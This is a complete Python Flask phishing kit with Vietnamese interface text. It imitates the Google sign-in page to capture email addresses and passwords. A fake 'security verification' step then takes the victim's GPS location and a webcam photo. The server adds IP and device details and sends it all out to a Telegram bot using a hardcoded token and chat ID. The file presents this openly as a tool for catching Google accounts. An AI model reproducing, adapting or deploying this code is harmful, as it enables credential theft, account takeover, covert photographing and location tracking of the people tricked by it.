# app.py
# Python 3.10+
# Target: Advanced Phishing Portal (Email, Pass, GPS, Device Info, Webcam)
# Requires: flask, requests, user_agents

from flask import Flask, request, render_template_string, redirect, jsonify
import requests
import os
import base64
from user_agents import parse

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9050498708:AAG9AVoffgweODY06PWGLwNBRHXvoaN9B4s")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "9144223149")

# Bộ nhớ tạm lưu dữ liệu (Chỉ dùng cho test, nếu chạy thật nên dùng Redis/DB)
sessions = {}

CSS = """
<style>
    body { font-family: 'Roboto', arial, sans-serif; background: #f0f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-box { width: 450px; padding: 48px 40px 36px; background: #fff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; box-sizing: border-box; }
    .logo { width: 75px; margin-bottom: 16px; }
    h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
    p { font-size: 15px; margin-bottom: 30px; color: #5f6368; line-height: 1.5;}
    input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; margin-bottom: 15px; }
    input:focus { outline: none; border-color: #1a73e8; }
    .btn-next { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 6px; font-weight: 500; font-size: 15px; width: 100%; cursor: pointer; transition: 0.2s;}
    .btn-next:hover { background: #1557b0; }
    .hidden { display: none; }
    #video { width: 100%; border-radius: 8px; display: none; margin-bottom: 15px; border: 2px solid #1a73e8;}
</style>
"""

# BƯỚC 1: NHẬP EMAIL & PASS (GIAO DIỆN LOGIN GOOGLE)
HTML_LOGIN = f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Đăng nhập - Tài khoản Google</title>{CSS}</head>
<body>
    <div class="login-box">
        <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
        <h1>Đăng nhập</h1>
        <p>Để tiếp tục, hãy đăng nhập vào Tài khoản Google của bạn</p>
        <form method="POST" action="/login">
            <input type="email" name="username" placeholder="Email hoặc số điện thoại" required>
            <input type="password" name="password" placeholder="Nhập mật khẩu" required>
            <button type="submit" class="btn-next">Đăng nhập</button>
        </form>
    </div>
</body></html>
"""

# BƯỚC 2: XÁC MINH VỊ TRÍ & CAMERA
HTML_VERIFY = f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Xác minh danh tính</title>{CSS}</head>
<body>
    <div class="login-box">
        <h1>Xác minh bảo mật</h1>
        <p>Hệ thống phát hiện đăng nhập từ thiết bị lạ. Vui lòng cho phép truy cập Vị trí và Camera để xác minh.</p>
        
        <video id="video" autoplay playsinline></video>
        <button id="verifyBtn" class="btn-next">Bật Camera & Xác minh</button>
        <p id="status" style="color: #d93025; font-size: 13px; margin-top: 10px;"></p>
    </div>

    <script>
        const btn = document.getElementById('verifyBtn');
        const video = document.getElementById('video');
        const status = document.getElementById('status');

        btn.addEventListener('click', async () => {{
            status.innerText = "Đang yêu cầu quyền...";
            let lat = "Unknown", lon = "Unknown";

            // 1. Lấy vị trí
            try {{
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {{timeout: 5000}}));
                lat = pos.coords.latitude;
                lon = pos.coords.longitude;
            }} catch(e) {{ console.log("GPS denied"); }}

            // 2. Lấy Camera
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: false }});
                video.srcObject = stream;
                video.style.display = 'block';
                btn.style.display = 'none';
                status.innerText = "Đang chụp ảnh xác minh...";
                
                setTimeout(() => {{
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    
                    // Gửi dữ liệu
                    fetch('/upload_verify', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{ image: imageData, lat: lat, lon: lon }})
                    }}).then(() => {{
                        status.style.color = "green";
                        status.innerText = "Xác minh thành công! Đang chuyển hướng...";
                        setTimeout(() => window.location.href = "https://myaccount.google.com", 1500);
                    }});
                    
                    stream.getTracks().forEach(track => track.stop());
                }}, 2000);
            }} catch (err) {{
                status.innerText = "Bạn cần cấp quyền Camera để tiếp tục!";
            }}
        }});
    </script>
</body></html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_LOGIN)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    ua_string = request.headers.get('User-Agent')
    
    # Phân tích thiết bị
    user_agent = parse(ua_string)
    device_info = f"{user_agent.os.family} {user_agent.os.version_string} - {user_agent.browser.family}"
    is_mobile = "Điện thoại" if user_agent.is_mobile else "Máy tính"
    
    # Lưu vào bộ nhớ tạm
    sessions[email] = {
        "email": email,
        "password": password,
        "ip": ip,
        "device": device_info,
        "type": is_mobile,
        "ua": ua_string
    }
    
    return redirect(f"/verify?email={email}")

@app.route('/verify')
def verify_page():
    return render_template_string(HTML_VERIFY)

@app.route('/upload_verify', methods=['POST'])
def upload_verify():
    data = request.json
    email = request.referrer.split('email=')[-1] if 'email=' in request.referrer else "Unknown"
    image_b64 = data.get('image')
    lat = data.get('lat')
    lon = data.get('lon')
    
    if email in sessions:
        sessions[email]['lat'] = lat
        sessions[email]['lon'] = lon
        sessions[email]['image'] = image_b64
        
        # Bắn Telegram 1 lần duy nhất khi đã có đủ dữ liệu
        send_telegram_report(sessions[email])
        
        # Xóa session sau khi gửi để tránh gửi trùng
        del sessions[email]

    return jsonify({"status": "ok"})

def send_telegram_report(data):
    # Format lại giao diện tin nhắn Telegram
    map_link = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}" if data.get('lat') != "Unknown" else "Không xác định"
    
    caption = (
        f"🎯 **BẮT ĐƯỢC ACC GOOGLE!**\n\n"
        f"👤 **Email:** `{data['email']}`\n"
        f"🔑 **Pass:** `{data['password']}`\n"
        f"🌐 **IP:** `{data['ip']}`\n"
        f"📱 **Thiết bị:** {data['type']} ({data['device']})\n"
        f"📍 **Vị trí:** [Xem trên bản đồ]({map_link})\n\n"
        f"🍪 **User Agent:** `{data['ua'][:50]}...`"
    )

    # Xử lý ảnh Base64
    image_b64 = data.get('image')
    
    if image_b64:
        img_bytes = base64.b64decode(image_b64.split(',')[1])
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        files = {'photo': ('face.jpg', img_bytes, 'image/jpeg')}
        payload = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "Markdown"}
        try:
            requests.post(url, data=payload, files=files, timeout=10)
        except Exception as e:
            print(f"Lỗi gửi ảnh: {e}")
    else:
        # Nếu không có ảnh, chỉ gửi text
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": caption, "parse_mode": "Markdown"}
        requests.post(url, json=payload)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
